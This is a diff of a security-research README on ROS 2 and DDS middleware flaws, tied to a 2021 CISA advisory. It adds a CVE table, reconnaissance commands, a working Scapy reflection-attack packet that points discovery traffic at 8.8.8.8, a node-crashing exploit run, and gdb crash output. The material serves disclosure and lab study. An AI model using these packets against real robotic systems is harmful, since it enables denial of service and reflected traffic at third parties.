@@ -12,7 +12,19 @@ The following security flaws are exploited:
 
 | CVE ID | Description | Scope    |  CVSS    | Notes  |
 |--------|-------------|----------|----------|--------|
-| | | |
+| CVE-2021-38445 | OCI OpenDDS versions prior to 3.18.1 do not handle a length parameter consistent with the actual length of the associated data, which may allow an attacker to remotely execute arbitrary code.  | OpenDDS, ROS 2<sub>*</sub> | [7.0](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:M/AR:H) | Failed assertion [>= 3.18.1](https://github.com/objectcomputing/OpenDDS/releases/tag/DDS-3.18.1) |
+| CVE-2021-38447 | OCI OpenDDS versions prior to 3.18.1 are vulnerable when an attacker sends a specially crafted packet to flood  target devices with unwanted traffic, which may result in a denial-of-service condition.  | OpenDDS, ROS 2<sub>*</sub>   | [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:M/AR:H) | Resource exhaustion  [>= 3.18.1](https://github.com/objectcomputing/OpenDDS/releases/tag/DDS-3.18.1) |
+| CVE-2021-38435 | RTI Connext DDS Professional, Connext DDS Secure Versions 4.2x to 6.1.0, and Connext DDS Micro Versions  3.0.0 and later do not correctly calculate the size when allocating the buffer, which may result in a buffer  overflow | ConnextDDS, ROS 2<sub>*</sub>   | [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:M/AR:H) | Segmentation fault via network   [>= 6.1.0](https://community.rti.com/kb/ics-cert-security-notice-ics-vu-575352-vu770071) |
+| CVE-2021-38423 | All versions of GurumDDS improperly calculate the size to be used when allocating the buffer, which may result  in a buffer overflow. | GurumDDS, ROS 2<sub>*</sub>   | [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RC:C/CR:M/AR:H) | Segmentation fault via network |
+| CVE-2021-38439 | All versions of GurumDDS are vulnerable to heap-based buffer overflow, which may cause a denial-of-service condition or remotely execute arbitrary code.  | GurumDDS, ROS 2<sub>*</sub> | [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RC:C/CR:M/AR:H) | Heap-overflow via network |
+| CVE-2021-38437 | | GurumDDS, ROS 2<sub>*</sub>       | [7.3](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:U/RC:C/CR:M/AR:H) | Unmaintained XML lib. |
+| CVE-2021-38441 | Eclipse CycloneDDS versions prior to 0.8.0 are vulnerable to a write-what-where condition, which may allow an  attacker to write arbitrary values in the XML parser. | CycloneDDS, ROS 2<sub>*</sub>   | [6.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H/E:U/RL:O/RC:C/CR:M/AR:H)     | Heap-write in XML parser |
+| CVE-2021-38443 | Eclipse CycloneDDS versions prior to 0.8.0 improperly handle invalid structures, which may allow an attacker to  write arbitrary values in the XML parser.  | CycloneDDS, ROS 2<sub>*</sub>       | [6.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H/E:U/RL:O/RC:C/CR:M/AR:H)     |8-bytes heap-write in XML parser |
+| CVE-2021-38427 | RTI Connext DDS Professional, Connext DDS Secure Versions 4.2x to 6.1.0, and Connext DDS Micro Versions  3.0.0 and later are vulnerable to a stack-based buffer overflow, which may allow a local attacker to execute  arbitrary code | RTI ConnextDDS, ROS 2<sub>*</sub>  | [6.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H/E:U/RL:O/RC:C/CR:H/AR:H) |Stack overflow in XML parser [>= 6.1.0](https://community.rti.com/kb/ics-cert-security-notice-ics-vu-575352-vu770071) |
+| CVE-2021-38433 | RTI Connext DDS Professional, Connext DDS Secure Versions 4.2x to 6.1.0, and Connext DDS Micro Versions  3.0.0 and later are vulnerable to a stack-based buffer overflow, which may allow a local attacker to execute  arbitrary code. |  RTI ConnextDDS, ROS 2<sub>*</sub>     | [6.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H/E:U/RL:O/RC:C/CR:H/AR:H) | Stack overflow in XML parser [>= 6.1.0](https://community.rti.com/kb/ics-cert-security-notice-ics-vu-575352-vu770071) |
+| CVE-2021-38487 | RTI Connext DDS Professional, Connext DDS Secure Versions 4.2x to 6.1.0, and Connext DDS Micro Versions 3.0.0 and later are vulnerable when an attacker sends a specially crafted packet to flood victims’ devices with  unwanted traffic, which may result in a denial-of-service condition. | ConnextDDS, ROS 2<sub>*</sub>         | [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:L/AR:H) | [Mitigation patch in >= 6.1.0](https://community.rti.com/kb/ics-cert-security-notice-ics-vu-575352-vu770071) |
+| CVE-2021-38429 | OCI OpenDDS versions prior to 3.18.1 are vulnerable when an attacker sends a specially crafted packet to flood victims’ devices with unwanted traffic, which may result in a denial-of-service condition. | OpenDDS, ROS 2<sub>*</sub>      |     [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:L/AR:H) | [Mitigation patch in >= 3.18.1](https://github.com/objectcomputing/OpenDDS/releases/tag/DDS-3.18.1) |
+| CVE-2021-38425 | eProsima Fast-DDS versions prior to 2.4.0 (#2269) are susceptible to exploitation when an attacker sends a  specially crafted packet to flood a target device with unwanted traffic, which may result in a denial-of-service  condition. | eProsima Fast-DDS, ROS 2<sub>*</sub>  | [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:T/RC:C/CR:L/AR:H) | [WIP mitigation in master](https://github.com/eProsima/Fast-DDS/issues/2267)     |
 
 
 ### Dissecting ROS 2 network interactions
@@ -102,7 +114,202 @@ xhost + # (careful with this! use your IP instead if possible)
 docker run -it -v /tmp/.X11-unix:/tmp/.X11-unix -e DISPLAY=$DISPLAY -v $HOME/.Xauthority:/home/xilinx/.Xauthority hacking_ros2:foxy
 ```
 
-### Crashing ROS 2 Nodes
+### ROS 2 reconnaissance
+
+
+python run.py list.txt -t 10 -b blk.lst -p -o out.csv 31337 7400
+
+python run.py filter list.txt -t 10 -b blk.lst -p -o out.csv 31337 7400
+
+
+
+### ROS 2 reflection attack
+
+Let's try this out in the dockerized environment using byobu to facilitate the setup:
+
+```bash
+## terminal 1 - ROS 2 Node
+# Launch container
+docker run -it hacking_ros2:foxy /bin/bash
+
+# (inside of the container), launch configuration
+byobu -f configs/ros2_reflection.conf attach
+
+## terminal 1 - attacker
+# Launch the exploit
+sudo python3 exploits/reflection.py 2> /dev/null
+```
+
+#### Looking at the exploit
+
+```python
+from scapy.all import *
+from scapy.layers.inet import UDP, IP
+from scapy.contrib.rtps import *
+
+bind_layers(UDP, RTPS)
+conf.verb = 0
+
+dst = "172.17.0.2"
+sport = 17900
+dport = 7400
+
+package = (
+    IP(
+        version=4,
+        ihl=5,
+        tos=0,
+        len=288,
+        id=41057,
+        flags=2,
+        frag=0,
+        dst=dst,
+    )
+    / UDP(sport=45892, dport=dport, len=268)
+    / RTPS(
+        protocolVersion=ProtocolVersionPacket(major=2, minor=4),
+        vendorId=VendorIdPacket(vendor_id=b"\x01\x03"),
+        guidPrefix=GUIDPrefixPacket(
+            hostId=16974402, appId=2886795267, instanceId=10045242
+        ),
+        magic=b"RTPS",
+    )
+    / RTPSMessage(
+        submessages=[
+            RTPSSubMessage_DATA(
+                submessageId=21,
+                submessageFlags=5,
+                octetsToNextHeader=0,
+                extraFlags=0,
+                octetsToInlineQoS=16,
+                readerEntityIdKey=0,
+                readerEntityIdKind=0,
+                writerEntityIdKey=256,
+                writerEntityIdKind=194,
+                writerSeqNumHi=0,
+                writerSeqNumLow=1,
+                data=DataPacket(
+                    encapsulationKind=3,
+                    encapsulationOptions=0,
+                    parameterList=ParameterListPacket(
+                        parameterValues=[
+                            PID_BUILTIN_ENDPOINT_QOS(
+                                parameterId=119,
+                                parameterLength=4,
+                                parameterData=b"\x00\x00\x00\x00",
+                            ),
+                            PID_DOMAIN_ID(
+                                parameterId=15,
+                                parameterLength=4,
+                                parameterData=b"*\x00\x00\x00",
+                            ),
+                            PID_PROTOCOL_VERSION(
+                                parameterId=21,
+                                parameterLength=4,
+                                protocolVersion=ProtocolVersionPacket(major=2, minor=4),
+                                padding=b"\x00\x00",
+                            ),
+                            PID_PARTICIPANT_GUID(
+                                parameterId=80,
+                                parameterLength=16,
+                                parameterData=b"\x01\x03\x02B\xac\x11\x00\x03\x00\x99G:\x00\x00\x01\xc1",
+                            ),
+                            PID_VENDOR_ID(
+                                parameterId=22,
+                                parameterLength=4,
+                                vendorId=VendorIdPacket(vendor_id=b"\x01\x03"),
+                                padding=b"\x00\x00",
+                            ),
+                            PID_PARTICIPANT_BUILTIN_ENDPOINTS(
+                                parameterId=68,
+                                parameterLength=4,
+                                parameterData=b"?\xfc\x00\x00",
+                            ),
+                            PID_BUILTIN_ENDPOINT_SET(
+                                parameterId=88,
+                                parameterLength=4,
+                                parameterData=b"?\xfc\x00\x00",
+                            ),
+                            PID_METATRAFFIC_UNICAST_LOCATOR(
+                                parameterId=50,
+                                parameterLength=24,
+                                locator=LocatorPacket(
+                                    locatorKind=16777216, port=47324, address="8.8.8.8"
+                                ),
+                            ),
+                            PID_METATRAFFIC_MULTICAST_LOCATOR(
+                                parameterId=51,
+                                parameterLength=24,
+                                locator=LocatorPacket(
+                                    locatorKind=16777216,
+                                    port=17902,
+                                    address="239.255.0.1",
+                                ),
+                            ),
+                            PID_DEFAULT_UNICAST_LOCATOR(
+                                parameterId=49,
+                                parameterLength=24,
+                                locator=LocatorPacket(
+                                    locatorKind=16777216,
+                                    port=12345,
+                                    address="127.0.0.1",
+                                ),
+                            ),
+                            PID_DEFAULT_MULTICAST_LOCATOR(
+                                parameterId=72,
+                                parameterLength=24,
+                                locator=LocatorPacket(
+                                    locatorKind=16777216,
+                                    port=12345,
+                                    address="127.0.0.1",
+                                ),
+                            ),
+                            PID_PARTICIPANT_MANUAL_LIVELINESS_COUNT(
+                                parameterId=52,
+                                parameterLength=4,
+                                parameterData=b"\x00\x00\x00\x00",
+                            ),
+                            PID_UNKNOWN(
+                                parameterId=45061,
+                                parameterLength=4,
+                                parameterData=b"\x03\x00\x00\x00",
+                            ),
+                            PID_PARTICIPANT_LEASE_DURATION(
+                                parameterId=2,
+                                parameterLength=8,
+                                parameterData=b",\x01\x00\x00\x00\x00\x00\x00",
+                            ),
+                        ],
+                        sentinel=PID_SENTINEL(parameterId=1, parameterLength=0),
+                    ),
+                ),
+            )
+        ]
+    )
+)
+
+send(package)
+```
+
+
+### ROS 2 Node crashing
+
+Let's try this out in the dockerized environment using byobu to facilitate the setup:
+
+```bash
+## terminal 1 - ROS 2 Node
+# Launch container
+docker run -it hacking_ros2:foxy /bin/bash
+
+# (inside of the container), launch conriguration
+byobu -f configs/ros2_crash.conf attach
+
+## terminal 1 - attacker
+# Launch the exploit
+sudo python3 exploits/crash.py 2> /dev/null
+```
+
+#### Looking at the exploit
 
 ```python
 """
@@ -175,16 +382,92 @@ opendds_crasher = (
 )
 ```
 
-Let's try this out in the dockerized environment using byobu to facilitate the setup:
+
+#### Looking deeper into the crash issue
+
+This flaw was fixed in [OpenDDS >3.18.1](https://github.com/objectcomputing/OpenDDS/releases/tag/DDS-3.18.1) but if you wish to look deeper into it, debug the node, find the crash and further inspect the source code. Here're are a few tips to do so:
 
 ```bash
-# Launch container
-docker run -it hacking_ros2:foxy /bin/bash
-
-# (inside of the container), launch conriguration
-byobu -f configs/poc.conf attach
+## terminal 1 - ROS 2 Node
+# rebuild workspace with debug symbols
+colcon build --merge-install --packages-up-to examples_rclcpp_minimal_publisher --cmake-args -DCMAKE_BUILD_TYPE=Debug
 ```
 
+and then debug the node with `gdb`:
+
+```bash
+## terminal 1 - ROS 2 Node
+apt-get install gdb  # install gdb
+wget -P ~ https://git.io/.gdbinit  # get a comfortable debugging environment
+
+source /opt/opendds_ws/install/setup.bash
+export RMW_IMPLEMENTATION=rmw_opendds_cpp
+# launch debugging session with OpenDDS
+gdb /opt/opendds_ws/install/lib/examples_rclcpp_minimal_publisher/publisher_lambda
+```
+
+if done properly, this should lead you to the following:
+
+```bash
+─── Assembly ─────────────────────────────────────────────────────────────────────────────────────
+ 0x00007f2c8479517a  __GI_raise+186 xor    %edx,%edx
+ 0x00007f2c8479517c  __GI_raise+188 mov    %r9,%rsi
+ 0x00007f2c8479517f  __GI_raise+191 mov    $0x2,%edi
+ 0x00007f2c84795184  __GI_raise+196 mov    $0xe,%eax
+ 0x00007f2c84795189  __GI_raise+201 syscall
+ 0x00007f2c8479518b  __GI_raise+203 mov    0x108(%rsp),%rax
+ 0x00007f2c84795193  __GI_raise+211 xor    %fs:0x28,%rax
+ 0x00007f2c8479519c  __GI_raise+220 jne    0x7f2c847951c4 <__GI_raise+260>
+ 0x00007f2c8479519e  __GI_raise+222 mov    %r8d,%eax
+ 0x00007f2c847951a1  __GI_raise+225 add    $0x118,%rsp
+─── Breakpoints ──────────────────────────────────────────────────────────────────────────────────
+─── Expressions ──────────────────────────────────────────────────────────────────────────────────
+─── History ──────────────────────────────────────────────────────────────────────────────────────
+─── Memory ───────────────────────────────────────────────────────────────────────────────────────
+─── Registers ────────────────────────────────────────────────────────────────────────────────────
+       rax 0x0000000000000000        rbx 0x00007f2c81b49700          rcx 0x00007f2c8479518b
+       rdx 0x0000000000000000        rsi 0x00007f2c81b479d0          rdi 0x0000000000000002
+       rbp 0x00007f2c8490a588        rsp 0x00007f2c81b479d0           r8 0x0000000000000000
+        r9 0x00007f2c81b479d0        r10 0x0000000000000008          r11 0x0000000000000246
+       r12 0x00007f2c83af1e00        r13 0x0000000000000176          r14 0x00007f2c83af21c4
+       r15 0x0000000000000000        rip 0x00007f2c8479518b       eflags [ PF ZF IF ]
+        cs 0x00000033                 ss 0x0000002b                   ds 0x00000000
+        es 0x00000000                 fs 0x00000000                   gs 0x00000000
+─── Source ───────────────────────────────────────────────────────────────────────────────────────
+Cannot display "raise.c"
+─── Stack ────────────────────────────────────────────────────────────────────────────────────────
+[0] from 0x00007f2c8479518b in __GI_raise+203 at ../sysdeps/unix/sysv/linux/raise.c:50
+[1] from 0x00007f2c84774859 in __GI_abort+299 at abort.c:79
+[2] from 0x00007f2c84774729 in __assert_fail_base+-71239 at assert.c:92
+[3] from 0x00007f2c84785f36 in __GI___assert_fail+70 at assert.c:101
+[4] from 0x00007f2c836bbc38 in OpenDDS::DCPS::Serializer::smemcpy(char*, char const*, unsigned long)+66 at /opt/OpenDDS/dds/DCPS/Serializer.cpp:374
+[5] from 0x00007f2c81cc51ba in OpenDDS::DCPS::Serializer::doread(char*, unsigned long, bool, unsigned long)+250 at ../../../../dds/DCPS/Serializer.inl:243
+[6] from 0x00007f2c81cc52a0 in OpenDDS::DCPS::Serializer::buffer_read(char*, unsigned long, bool)+78 at ../../../../dds/DCPS/Serializer.inl:296
+[7] from 0x00007f2c81cc5537 in OpenDDS::DCPS::operator>>(OpenDDS::DCPS::Serializer&, unsigned int&)+89 at ../../../../dds/DCPS/Serializer.inl:1193
+[8] from 0x00007f2c83f78bf8 in OpenDDS::DCPS::operator>>(OpenDDS::DCPS::Serializer&, OpenDDS::RTPS::Parameter&)+7538 at /opt/OpenDDS/dds/DCPS/RTPS/RtpsCoreTypeSupportImpl.cpp:13064
+[9] from 0x00007f2c83f6f2e6 in OpenDDS::DCPS::operator>>(OpenDDS::DCPS::Serializer&, OpenDDS::RTPS::ParameterList&)+102 at /opt/OpenDDS/dds/DCPS/RTPS/RtpsCoreTypeSupportImpl.cpp:9890
+[+]
+─── Threads ──────────────────────────────────────────────────────────────────────────────────────
+[7] id 16227 name publisher_lambd from 0x00007f2c8473c376 in futex_wait_cancelable+29 at ../sysdeps/nptl/futex-internal.h:183
+[6] id 16226 name publisher_lambd from 0x00007f2c8486712b in __GI___select+107 at ../sysdeps/unix/sysv/linux/select.c:41
+[5] id 16215 name publisher_lambd from 0x00007f2c8473c376 in futex_wait_cancelable+29 at ../sysdeps/nptl/futex-internal.h:183
+[4] id 16214 name publisher_lambd from 0x00007f2c8479518b in __GI_raise+203 at ../sysdeps/unix/sysv/linux/raise.c:50
+[3] id 16213 name publisher_lambd from 0x00007f2c8473f3f4 in futex_abstimed_wait_cancelable+42 at ../sysdeps/nptl/futex-internal.h:320
+[2] id 16212 name publisher_lambd from 0x00007f2c8486712b in __GI___select+107 at ../sysdeps/unix/sysv/linux/select.c:41
+[1] id 16170 name publisher_lambd from 0x00007f2c8473c7b1 in futex_abstimed_wait_cancelable+415 at ../sysdeps/nptl/futex-internal.h:320
+─── Variables ────────────────────────────────────────────────────────────────────────────────────
+arg sig = 6
+loc set = {__val = {[0] = 18446744067266838239, [1] = 139829178189904, [2] = 4222451712, [3] = 139828901466080…, pid = <optimized out>, tid = <optimized out>
+──────────────────────────────────────────────────────────────────────────────────────────────────
+```
 
 ### Credit
-This research is the result of a cooperation among various security researchers. The following individuals too part on it:
+This research is the result of a cooperation among various security researchers and reported in [this advisory](https://us-cert.cisa.gov/ics/advisories/icsa-21-315-02). The following individuals too part on it (alphabetical order):
+
+- [Chizuru Toyama](https://www.linkedin.com/in/chizuru-toyama-0a070427/)
+- [Erik Boasson](https://www.linkedin.com/in/erik-boasson-21344912/)
+- [Federico Maggi](https://www.linkedin.com/in/phretor)
+- [Mars Cheng](https://www.linkedin.com/in/marscheng93/)
+- Patrick Kuo
+- [Ta-Lun Yen](https://www.linkedin.com/in/evsfy/)
+- [Víctor Mayoral-Vilches](https://www.linkedin.com/in/vmayoral/)
